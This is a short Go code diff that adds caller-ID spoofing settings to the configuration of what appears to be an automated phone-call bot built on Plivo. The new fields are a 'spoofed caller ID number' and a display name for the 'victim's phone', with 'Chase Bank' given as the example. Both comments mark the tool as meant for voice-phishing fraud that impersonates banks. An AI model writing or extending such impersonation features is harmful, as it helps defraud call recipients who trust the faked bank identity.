@@ -17,6 +17,8 @@ type Config struct {
 	PlivoAuthID    string  `yaml:"plivo_auth_id"`
 	PlivoAuthToken string  `yaml:"plivo_auth_token"`
 	PlivoNumber    string  `yaml:"plivo_number"`
+	CallerID       string  `yaml:"caller_id"`      // Spoofed caller ID number (must be verified in Plivo)
+	CallerName     string  `yaml:"caller_name"`    // Display name on victim's phone (e.g., "Chase Bank")
 	AdminIDs       []int64 `yaml:"admin_ids"`
 	NgrokURL       string  `yaml:"ngrok_url"`
 	Port           string  `yaml:"port"`
@@ -142,6 +144,10 @@ func (l *Loader) applyDefaults(cfg *Config) {
 	}
 	if cfg.AdminIDs == nil {
 		cfg.AdminIDs = []int64{}
+	}
+	// CallerID defaults to PlivoNumber if not set
+	if cfg.CallerID == "" {
+		cfg.CallerID = cfg.PlivoNumber
 	}
 }
 
